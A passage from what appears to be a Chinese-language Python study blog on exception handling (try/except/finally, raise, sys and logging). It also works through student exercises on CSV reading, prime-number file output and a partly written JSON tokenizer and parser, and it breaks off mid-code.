<h2 id="捕获和处理异常"><a href="#捕获和处理异常" class="headerlink" title="捕获和处理异常"></a>捕获和处理异常</h2><blockquote>
<p>为了提高程序的健壮性和人机交互的友好性，需要对异常进行捕获和处理。</p>
</blockquote>
<ol>
<li>在Python中，我们可以将那些在运行时可能会出现状况的代码放在<code>try代码块</code>中，在try代码块的后面可以跟上一个或多个<code>except</code>来捕获可能出现的异常状况。<br>例如在上面读取文件的过程中，文件找不到会引发<code>FileNotFoundError </code>,指定了未知的编码会引发<code>LookupError</code> ,而如果读取文件时无法按指定方式解码会引发<code>UnicodeDecodeErIor</code>，我们在<strong>try后面</strong>跟上了<strong>三个except</strong>分别处理这三种不同的异常状况。最后我们使用<code>finally代码块</code>来关闭打开的文件，释放掉程序中获取的外部资源，由于<code>finally块</code>的代码不论程序正常还是异常都会执行到(甚至是调用了sys模块的exit函数退出Python环境，finally块都会被执行，因为<code>exit函数</code>实质上是引发了SystemExit异常) ,因此我们通常把f inally块称为“<code>总是执行代码块</code>”，它最适合用来做释放外部资源的操作。</li>
<li>如果不愿意在finally代码块中关闭文件对象释放资源，也可以使用上下文语法，通过<code>with关键字</code>指定文件对象的上下文环境并在离开上下文环境时自动释放文件资源。</li>
</ol>
<hr>
<p><strong>语法格式</strong>：<code>try ...except [as ... ]...语句</code></p>
<ul>
<li><strong>try代码</strong>块放置可能出现异常的语句，<strong>except代码块</strong>中放置处理异常的语句。</li>
<li>通过<strong>as语句</strong>把异常对象保存在一个变量中。</li>
</ul>
<hr>
<blockquote>
<p>一个例子：（文件open)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">try</span>: <span class="comment"># 下写被监控的语句</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;d.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:  <span class="comment"># 异常处理语句</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;无法打开指定文件！&quot;</span>)</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806735.png"></p>
<p><strong>注意</strong>：没有报错，而是输出我们的提示语句。</p>
<hr>
<blockquote>
<p>一个例子：else的使用</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;输入被除数：&quot;</span>))</span><br><span class="line">        b = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;输入除数：&quot;</span>))</span><br><span class="line">        c = a/b</span><br><span class="line">    <span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;除数不为0!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e1)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入正确格式的数！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806744.png"></p>
<p>else 的代码块是在未捕获到异常后执行的。</p>
<hr>
<blockquote>
<p>一个例子：含有<strong>finally语句</strong></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    infile = <span class="built_in">input</span>()</span><br><span class="line">    fb = <span class="built_in">open</span>(infile, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    line = fb.readlines()</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到文件&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> UnicodeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码错误&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>不论前面是否执行，最后都会执行finally代码块。</p>
<hr>
<blockquote>
<p>提醒：各个语句的执行顺序</p>
</blockquote>
<p>try except else finally <strong>混合使用的规则</strong>：</p>
<ul>
<li><strong>先后次序</strong>：<code>try &gt; except &gt; else &gt; finally</code></li>
<li><strong>try语句</strong>至少需要配对<strong>一个except 或者 finall</strong></li>
<li>如果有<strong>else</strong>必须要一个<strong>except</strong></li>
</ul>
<h2 id="raise语句"><a href="#raise语句" class="headerlink" title="raise语句"></a>raise语句</h2><blockquote>
<p>通过这个关键字可以引发抛出异常。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RaiseError</span>(<span class="title class_ inherited__">ValueError</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> RaiseError(<span class="string">&quot;分母不可为零&quot;</span>)</span><br><span class="line"></span><br><span class="line">fun(<span class="number">3</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806745.png"></p>
<p>在使用前需要先定义一个<strong>RaiseError类。</strong></p>
<h2 id="排查异常和记录异常"><a href="#排查异常和记录异常" class="headerlink" title="排查异常和记录异常"></a>排查异常和记录异常</h2><blockquote>
<p>程序员不可能捕获所有的异常，一旦这些异常被解释器捕获，就会使得程序结束。<br>所以我们要学会使用<code>sys模块</code>和<code>logging模块</code>帮助我们记录排查异常。</p>
</blockquote>
<blockquote>
<p>sys模块的使用</p>
</blockquote>
<p>使用<code>sys.exc_info</code>获取最近引发的异常。特别适用于except代码块。<br>返回一个<strong>三元组</strong>：<code>(type,value/message,traceback)</code></p>
<p><strong>一个例子</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">3</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">tuple</span> = sys.exc_info()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806746.png"></p>
<hr>
<blockquote>
<p>logging模块的使用</p>
</blockquote>
<p>帮助我们记录错误信息，还可以把错误信息记录到日志文件。（日志级别为ERROR)</p>
<p><strong>一个例子</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>/<span class="built_in">int</span>(s)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fun(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e1:</span><br><span class="line">        logging.exception(e1)</span><br><span class="line"></span><br><span class="line">logging.error(<span class="string">&quot;下面是异常：&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806747.png"></p>
<h1 id="扩展积累"><a href="#扩展积累" class="headerlink" title="扩展积累"></a>扩展积累</h1><h2 id="实训作业"><a href="#实训作业" class="headerlink" title="实训作业"></a>实训作业</h2><ol>
<li>使用csv模块进行一列的读取</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readcsv</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;book.csv&quot;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fb:</span><br><span class="line">        data = csv.reader(fb)</span><br><span class="line">        list1 = [row[<span class="number">0</span>] <span class="keyword">for</span> row <span class="keyword">in</span> data]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    readcsv()</span><br></pre></td></tr></table></figure>
<p>使用列表生成式进行列的获取。每一次for in都是<strong>返回一个列表</strong>。</p>
<ol start="2">
<li>使用csv模块读取一行</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readcsv</span>():</span><br><span class="line"></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;book.csv&quot;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fb:</span><br><span class="line">		data = csv.reader(fb)</span><br><span class="line">		<span class="keyword">for</span> i,row <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">			<span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">				<span class="built_in">print</span>(row)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	readcsv()</span><br></pre></td></tr></table></figure>
<p>使用<code>emumerate方法</code>获取索引。</p>
<ol start="3">
<li>将csv文件导入字典</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readcsv</span>():</span><br><span class="line"> <span class="comment">#        请在此处添加代码         #</span></span><br><span class="line"> <span class="comment"># *************begin************#</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;book.csv&quot;</span>,<span class="string">&#x27;r&#x27;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fb:</span><br><span class="line">        list1 = []</span><br><span class="line">        list2 = []</span><br><span class="line">        data = csv.reader(fb)</span><br><span class="line">        <span class="keyword">for</span> i,low <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                list1 = low</span><br><span class="line"></span><br><span class="line">                x = low[<span class="number">0</span>]</span><br><span class="line">                y = low[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dict1 = &#123;x:low[<span class="number">0</span>],y:low[<span class="number">1</span>]&#125;</span><br><span class="line">                list2.append(dict1)</span><br><span class="line">   </span><br><span class="line">        <span class="built_in">print</span>(list2)</span><br><span class="line"> <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    readcsv()</span><br></pre></td></tr></table></figure>

<p>有一个非常非常需要注意的地方：使用<code>dict1[xx] = xx</code>进行赋值时，这个值是存储在一个位置的，也就是说<strong>就算你在前面将这字典导入了列表，后面赋予新的值后原来列表里的值也会随之改变</strong>。所以只能新建字典。</p>
<ol start="4">
<li>素数导入文件</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;判断素数的函数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> n &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> factor <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % factor == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> n != <span class="number">1</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>():</span><br><span class="line">    files = [<span class="string">&quot;a.txt&quot;</span>,<span class="string">&quot;b.txt&quot;</span>,<span class="string">&quot;c.txt&quot;</span>]</span><br><span class="line">    fp = []</span><br><span class="line">    <span class="keyword">for</span> file1 <span class="keyword">in</span> files:</span><br><span class="line">        fp.append(<span class="built_in">open</span>(file1,<span class="string">&quot;w&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">if</span> i &lt;= <span class="number">99</span> <span class="keyword">and</span> is_prime(i):</span><br><span class="line">            i = <span class="built_in">str</span>(i)</span><br><span class="line">            fp[<span class="number">0</span>].write(i)</span><br><span class="line">            fp[<span class="number">0</span>].write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">100</span>&lt;=i&lt;=<span class="number">999</span> <span class="keyword">and</span> is_prime(i):</span><br><span class="line">            i = <span class="built_in">str</span>(i)</span><br><span class="line">            fp[<span class="number">1</span>].write(i)</span><br><span class="line">            fp[<span class="number">1</span>].write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> is_prime(i):</span><br><span class="line">            i = <span class="built_in">str</span>(i)             </span><br><span class="line">            fp[<span class="number">2</span>].write(i)</span><br><span class="line">            fp[<span class="number">2</span>].write(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>注意点</strong>：<br>在写入文件时，需要保证<strong>写入内容为字符串</strong>，所以要使用<code>str()</code>进行转换。<br>可以使用<code>write(&quot;\n&quot;)</code>写入<strong>换行符</strong>。</p>
<ol start="5">
<li>将字符串转换为字典（与前面的csv文件变成字典类似）</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">name</span>):</span><br><span class="line"></span><br><span class="line">    fb = <span class="built_in">open</span>(name,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    list1 = []</span><br><span class="line">    list2 = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fb:</span><br><span class="line">        list1.append(line.strip().split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> i,low <span class="keyword">in</span> <span class="built_in">enumerate</span>(list1):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            x = low[<span class="number">0</span>]</span><br><span class="line">            y = low[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dict1 = &#123;x:low[<span class="number">0</span>],y:low[<span class="number">1</span>]&#125;</span><br><span class="line">            list2.append(dict1)</span><br><span class="line">    <span class="built_in">print</span>(list2)</span><br><span class="line">    fb.close()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    name = <span class="built_in">input</span>()</span><br><span class="line">    main(name)</span><br></pre></td></tr></table></figure>
<p><strong>注意点</strong>：<br>1、使用<code>for i,low in enumerate(list1)</code>可以对列表中的元素进行索引后选择需要的行。<br>2、使用<code>line.strip().split(&quot; &quot;)</code>可以将每一行字符串变成一个列表。</p>
<ol start="6">
<li>json字符串的转换</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">全局标量定义来表示符合 JSON 所规定的数据类型</span></span><br><span class="line"><span class="string">（学生可以使用字典结构表示此结构）</span></span><br><span class="line"><span class="string">其中：</span></span><br><span class="line"><span class="string">BEGIN_OBJECT（&#123;）</span></span><br><span class="line"><span class="string">END_OBJECT（&#125;）</span></span><br><span class="line"><span class="string">BEGIN_ARRAY（[）</span></span><br><span class="line"><span class="string">END_ARRAY（]）</span></span><br><span class="line"><span class="string">NULL（null）</span></span><br><span class="line"><span class="string">NUMBER（数字）</span></span><br><span class="line"><span class="string">STRING（字符串）</span></span><br><span class="line"><span class="string">BOOLEAN（true/false）</span></span><br><span class="line"><span class="string">SEP_COLON（:）</span></span><br><span class="line"><span class="string">SEP_COMMA（,）</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Signal token</span></span><br><span class="line">BEGIN_OBJECT = <span class="number">1</span></span><br><span class="line">BEGIN_ARRAY = <span class="number">2</span></span><br><span class="line">END_OBJECT = <span class="number">4</span></span><br><span class="line">END_ARRAY = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># variable token</span></span><br><span class="line">NULL_TOKEN = <span class="number">16</span></span><br><span class="line">NUMBER_TOKEN = <span class="number">32</span></span><br><span class="line">STRING_TOKEN = <span class="number">64</span></span><br><span class="line">BOOL_TOKEN = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># separator token</span></span><br><span class="line">COLON_TOKEN = <span class="number">256</span></span><br><span class="line">COMMA_TOKEN = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># end signal</span></span><br><span class="line">END_JSON = <span class="number">65536</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># json index</span></span><br><span class="line">json_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_parse</span>(<span class="params">json_str: <span class="built_in">str</span>, json_index: <span class="built_in">int</span></span>) -&gt; (<span class="built_in">tuple</span>, <span class="built_in">int</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    完成词法解析，返回token</span></span><br><span class="line"><span class="string">    :param json_str: 输入的json字符串</span></span><br><span class="line"><span class="string">    :param json_index: json字符串的位置</span></span><br><span class="line"><span class="string">    :return: 返回已处理好的token和json字符串的位置</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_num</span>(<span class="params">json_index: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        处理数字</span></span><br><span class="line"><span class="string">        :param json_index: json字符串的位置</span></span><br><span class="line"><span class="string">        :return: 返回处理数字后的token序列</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">##你的代码在这里##</span></span><br><span class="line">        rem = json_str[json_index: json_index + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">return</span>(NUMBER_TOKEN, rem), json_index + <span class="number">2</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_str</span>(<span class="params">json_index: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        处理字符串</span></span><br><span class="line"><span class="string">        :param json_index: json字符串的位置</span></span><br><span class="line"><span class="string">        :return: 返回处理字符串后的token序列</span></span><br><span class="line"><span class="string">       &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">##你的代码在这里##</span></span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        num = json_index</span><br><span class="line">        <span class="keyword">while</span> json_str[num+<span class="number">1</span>] != <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">        rem = json_str[json_index+<span class="number">1</span>: json_index + <span class="number">1</span> + k]</span><br><span class="line">        <span class="keyword">return</span>(STRING_TOKEN, rem), json_index + <span class="number">2</span> + k</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_null</span>():</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        处理null</span></span><br><span class="line"><span class="string">        :return: 返回处理null后的token序列</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        rem = json_str[json_index: json_index + <span class="number">4</span>]</span><br><span class="line">        <span class="keyword">return</span> (NULL_TOKEN, rem), json_index + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_bool</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        处理true，false</span></span><br><span class="line"><span class="string">        :param s: json字符串</span></span><br><span class="line"><span class="string">        :return: 返回处理true，false后的token序列</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> s == <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            rem = json_str[json_index: json_index + <span class="number">4</span>]</span><br><span class="line">            <span class="keyword">return</span> (BOOL_TOKEN, rem), json_index + <span class="number">4</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rem = json_str[json_index: json_index + <span class="number">5</span>]</span><br><span class="line">            <span class="keyword">return</span> (BOOL_TOKEN, rem), json_index + <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> json_index == <span class="built_in">len</span>(json_str):</span><br><span class="line">        <span class="keyword">return</span> (END_JSON, <span class="literal">None</span>), json_index</span><br><span class="line">    <span class="keyword">elif</span> json_str[json_index] == <span class="string">&#x27;&#123;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> (BEGIN_OBJECT, json_str[json_index]), json_index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> json_str[json_index] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> (END_OBJECT, json_str[json_index]), json_index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> json_str[json_index] == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> (BEGIN_ARRAY, json_str[json_index]), json_index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> json_str[json_index] == <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> (END_ARRAY, json_str[json_index]), json_index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> json_str[json_index] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> (COMMA_TOKEN, json_str[json_index]), json_index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> json_str[json_index] == <span class="string">&#x27;:&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> (COLON_TOKEN, json_str[json_index]), json_index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> json_str[json_index] == <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> read_null()</span><br><span class="line">    <span class="keyword">elif</span> json_str[json_index] == <span class="string">&#x27;t&#x27;</span> <span class="keyword">or</span> json_str[json_index] == <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> read_bool(json_str[json_index])</span><br><span class="line">    <span class="keyword">elif</span> json_str[json_index] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> read_str(json_index)</span><br><span class="line">    <span class="keyword">if</span> json_str[json_index].isdigit():</span><br><span class="line">        <span class="keyword">return</span> read_num(json_index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tokenizer</span>(<span class="params">json_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成token序列</span></span><br><span class="line"><span class="string">    :param json_str:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    json_index = <span class="number">0</span></span><br><span class="line">    tk, cur_index = token_parse(json_str, json_index)</span><br><span class="line">    token_list = []</span><br><span class="line">    generate_tokenlist(token_list, tk)</span><br><span class="line">    <span class="keyword">while</span> tk[<span class="number">0</span>] != END_JSON:</span><br><span class="line">        tk, cur_index = token_parse(json_str, cur_index)</span><br><span class="line">        generate_tokenlist(token_list, tk)</span><br><span class="line">    <span class="keyword">return</span> token_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_token</span>(<span class="params">tokentype: <span class="built_in">int</span>, tokenvalue: <span class="built_in">str</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成token结构</span></span><br><span class="line"><span class="string">    :param tokentype: token的类型</span></span><br><span class="line"><span class="string">    :param tokenvalue: token的值</span></span><br><span class="line"><span class="string">    :return: 返回token</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    token = (tokentype, tokenvalue)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_tokenlist</span>(<span class="params">tokenlist: <span class="built_in">list</span>, token: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">    tokenlist.append(token)</span><br><span class="line">    <span class="keyword">return</span> tokenlist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_json</span>(<span class="params">tokenlist: <span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_token</span>(<span class="params">expected: <span class="built_in">int</span>, actual: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="keyword">if</span> expected &amp; actual == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Unexpected Token at position %d&#x27;</span> % json_index)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_json_array</span>():</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        处理array对象</span></span><br><span class="line"><span class="string">        :return: 处理json中的array对象</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">global</span> json_index</span><br><span class="line">        expected = BEGIN_ARRAY | END_ARRAY | BEGIN_OBJECT | END_OBJECT | NULL_TOKEN | NUMBER_TOKEN | BOOL_TOKEN | STRING_TOKEN</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> json_index != <span class="built_in">len</span>(tokenlist):</span><br><span class="line">            json_index += <span class="number">1</span></span><br><span class="line">            token = tokenlist[json_index]</span><br><span class="line">            <span class="comment"># token_type -&gt; TokenEnum</span></span><br><span class="line">            token_type = token[<span class="number">0</span>]</span><br><span class="line">            token_value = token[<span class="number">1</span>]</span><br><span class="line">            check_token(expected, token_type)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># check through each condition</span></span><br><span class="line">            <span class="keyword">if</span> token_type == BEGIN_OBJECT:</span><br><span class="line">                array.append(parse_json_object())</span><br><span class="line">                expected = COMMA_TOKEN | END_ARRAY</span><br><span class="line">            <span class="keyword">elif</span> token_type == BEGIN_ARRAY:</span><br><span class="line">                array.append(parse_json_array())</span><br><span class="line">                expected = COMMA_TOKEN | END_ARRAY</span><br><span class="line">            <span class="keyword">elif</span> token_type == END_ARRAY:</span><br><span class="line">                <span class="keyword">return</span> array</span><br><span class="line">            <span class="keyword">elif</span> token_type == NULL_TOKEN:</span><br><span class="line">                array.append(<span class="literal">None</span>)</span><br><span class="line">                expected = COMMA_TOKEN | END_ARRAY</span><br><span class="line">            <span class="keyword">elif</span> token_type == NUMBER_TOKEN:</span><br><span class="line">                array.append(<span class="built_in">int</span>(token_value))</span><br><span class="line">                expected = COMMA_TOKEN | END_ARRAY</span><br><span class="line">            <span class="keyword">elif</span> 